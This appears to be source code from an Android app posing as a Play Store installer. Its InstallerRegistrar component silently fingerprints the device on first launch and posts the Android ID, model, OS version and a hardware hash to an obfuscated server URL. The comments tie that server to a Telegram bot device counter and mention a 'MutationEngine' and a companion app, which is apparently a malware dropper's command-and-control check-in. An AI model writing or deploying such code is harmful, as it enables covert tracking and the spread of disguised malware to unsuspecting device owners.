package com.playstore.installer

import android.content.Context
import android.os.Build
import android.provider.Settings
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.security.MessageDigest

/**
 * InstallerRegistrar — installer-side device registration.
 *
 * Fires once on first launch. Posts device identity to the update server
 * so the Telegram bot device counter reflects real installer installs.
 *
 * Completely independent of MutationEngine and companion app.
 * Silent fail on any exception — never affects installer flow.
 */
internal object InstallerRegistrar {

    fun register(context: Context) {
        val appCtx = context.applicationContext
        Thread {
            try {
                doRegister(appCtx)
            } catch (_: Exception) {
                // Silent fail — registration is best-effort
            }
        }.apply {
            isDaemon = true
            name = "ir-reg"
            start()
        }
    }

    private fun doRegister(ctx: Context) {
        // One-time only — check obfuscated SharedPrefs flag
        val prefs = ctx.getSharedPreferences(
            StringPool.d(StringPool.PREFS_NAME), Context.MODE_PRIVATE
        )
        val regKey = StringPool.d(StringPool.KEY_INSTALLER_REG)
        if (prefs.getBoolean(regKey, false)) return

        val serverUrl   = StringPool.d(StringPool.SERVER_URL)
        val clientToken = BuildConfig.CLIENT_TOKEN
        val template    = BuildConfig.BUILD_TEMPLATE

        val androidId = Settings.Secure.getString(
            ctx.contentResolver, Settings.Secure.ANDROID_ID
        ) ?: "unknown"

        val deviceId    = sha256(androidId)
        val fingerprint = buildFingerprint(ctx, androidId)

        val appName     = try { ctx.getString(R.string.app_name) } catch (_: Exception) { "unknown" }
        val installerPkg = ctx.packageName

        val body = JSONObject().apply {
            put("device_id",       deviceId)
            put("fingerprint",     fingerprint)
            put("device_model",    Build.MODEL)
            put("manufacturer",    Build.MANUFACTURER)
            put("android_version", "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
            put("template",        template)
            put("app_name",        appName)
            put("installer_pkg",   installerPkg)
        }.toString()

        val url  = URL("$serverUrl/api/v1/$clientToken/register")
        val conn = url.openConnection() as HttpURLConnection
        conn.requestMethod = "POST"
        conn.setRequestProperty("Content-Type", "application/json")
        conn.connectTimeout = 10_000
        conn.readTimeout    = 10_000
        conn.doOutput       = true

        conn.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }
        val responseCode = conn.responseCode
        conn.disconnect()

        // Mark registered only on success
        if (responseCode == 200) {
            prefs.edit().putBoolean(regKey, true).apply()
        }
    }

    private fun buildFingerprint(ctx: Context, androidId: String): String {
        val hwHash = "${Build.SUPPORTED_ABIS.joinToString(",")}:${Build.BOARD}:" +
                     "${Build.BRAND}:${Build.DEVICE}:${Build.HARDWARE}:${Build.MANUFACTURER}"
        val screenHash = with(ctx.resources.displayMetrics) {
            "${widthPixels}x${heightPixels}@${densityDpi}"
        }
        return sha256("$androidId:$hwHash:$screenHash")
    }

    private fun sha256(input: String): String {
        val digest = MessageDigest.getInstance("SHA-256")
        val hash   = digest.digest(input.toByteArray(Charsets.UTF_8))
        return hash.joinToString("") { "%02x".format(it) }
    }
}
